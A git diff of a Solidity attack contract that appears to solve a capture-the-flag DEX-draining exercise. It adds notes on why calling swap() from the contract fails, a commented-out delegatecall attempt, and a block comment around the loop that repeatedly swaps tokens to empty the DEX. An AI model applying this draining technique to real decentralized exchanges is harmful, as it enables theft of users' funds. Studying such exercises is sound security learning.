@@ -41,6 +41,10 @@ contract AttackDEX {
   //   approvedTokens = true;
   // }
 
+  // @realizations -> swap() uses msg.sender as the token's owner, if the swap() is called directly by this contract, msg.sender will be the address of this contract instead of the player's address
+  // Even though the swap() is called using the low-level delegatecall() function, the swap fails!
+
+  // @SOLUTION ====> Migrate the logic of this function to a script that is executed from outside the blockchain! The swap() will be called directly from the player's account!
   function initiateAttack() public onlyPlayer() {
     uint dexAllowanceOnToken1PlayerBalance = IERC20(token1).allowance(player, address(dexContract));
     uint dexAllowanceOnToken2PlayerBalance = IERC20(token2).allowance(player, address(dexContract));
@@ -57,6 +61,12 @@ contract AttackDEX {
     // The attack starts by swapping ALL the tokens1 for tokens2
     dexContract.swap(token1,token2,playerToken1Balance);
 
+    // delegateCall to approve the DEX Contract to spend X Tokens on behalf of the Player
+    // (bool success, ) = address(dexContract).delegatecall(
+    //   abi.encodeWithSignature("swap(address,address,uint)", token1, token2, playerToken1Balance)
+    // );
+    // require(success, "Error while swapping using the delegatecall()");
+
     uint dexToken1Balance = dexContract.balanceOf(token1,address(dexContract));
     uint dexToken2Balance = dexContract.balanceOf(token2,address(dexContract));
 
@@ -66,6 +76,8 @@ contract AttackDEX {
     // On each iteration, the player's balance of one of the two tokens will be depleted to 0
     // When any of the player's token balances is greater than the DEX balance of the same token, the total amount of tokens to swap must be the exact amount of the DEX Balance
       // When the above condition is met, if the player sends its total token balance, the DEX balance of the other token won't be enough to match the require amount of tokens to swap, thus, will generate an error when attempting the transferFrom() operation
+    
+    /*
 
     while((dexToken1Balance > 0) || (dexToken2Balance > 0)) {
       // Swaps to continously drain the DEX token balances
@@ -98,6 +110,8 @@ contract AttackDEX {
     }
 
     require( (dexToken1Balance == 0) || (dexToken2Balance == 0) , "Error, unexpected error while depleting one of the DEX token's balances");
+
+    */
   }
 
 
